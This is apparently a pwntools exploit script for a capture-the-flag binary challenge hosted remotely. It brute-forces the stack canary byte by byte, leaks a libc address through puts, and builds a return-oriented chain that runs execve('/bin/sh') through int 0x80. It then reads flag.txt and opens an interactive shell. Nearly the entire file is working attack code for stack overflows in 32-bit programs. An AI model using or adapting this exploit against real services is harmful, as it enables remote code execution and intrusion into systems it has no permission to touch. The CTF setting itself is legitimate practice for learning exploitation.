#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 30130
HOST = "chall.v1t.site"
exe = context.binary = ELF('./chall_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
ld = ELF('./ld-linux.so.2', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            source /home/nhh/pwndbg/gdbinit.py
            # b* 0x08049268
            b* 0x0804927D
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()


# VARIABLE
rw_section = 0x8046800
main = exe.sym.main
vuln = exe.sym.vuln

# PAYLOAD
# GDB()
canary = b''
payload = b'a'*0x48 + b'\0'
cnt = 0
while True:
    log.info("Phase " + str(cnt + 1) + ": ")
    for i in range(0, 256):
        if i == 10:
            continue
        print(i)
        tmp = payload + bytes([i])
        p.sendlineafter(b'secret: ', tmp)
        leak = p.recvuntil(b'Another', drop=True)
        # print(leak)
        if b'*** stack smashing detected ***: terminated' not in leak:
            payload += bytes([i])
            canary += bytes([i])
            print("Part " + str(cnt + 1) + ": " + hex(i))
            break

    cnt += 1
    if cnt == 3:
        break

canary = int.from_bytes(canary, byteorder='little')
canary = canary << 8
log.info("Canary: " + hex(canary))

payload = flat(
    b'a'*0x48,
    canary,
    b'a'*4,
    0x804bff4,
    rw_section + 0x58,
    exe.plt.puts,
    vuln,
    exe.got.puts
    )
# GDB()
p.sendlineafter(b'secret: ', b'a')

p.sendlineafter(b'secret: ', payload)
p.recvuntil(b'flickers.\n')
libc_leak = u32(p.recv(4))
libc.address = libc_leak - 0x7c2a0
log.info("Libc base: " + hex(libc.address))
system = libc.sym.system
pop_eax = 0x000c6874 + libc.address
pop_ebx = 0x00024484 + libc.address
pop_ecx = 0x00173773 + libc.address
pop_edx = 0x0003bc9c + libc.address
int_0x80 = 0x00039d8c + libc.address
bin_sh = next(libc.search(b'/bin/sh'))
ret = 0x0002323d + libc.address

payload = b'/bin/sh'.ljust(0x48, b'\0')
payload += flat(
    canary,
    b'a'*8,
    rw_section + 0x58,
    pop_eax,
    0xb,
    pop_ebx,
    bin_sh,
    pop_ecx,
    0,
    pop_edx,
    0,
    int_0x80
    # system,
    # p32(bin_sh)*2
    )
p.sendline(payload)

p.sendline(b'cat flag.txt')

p.interactive()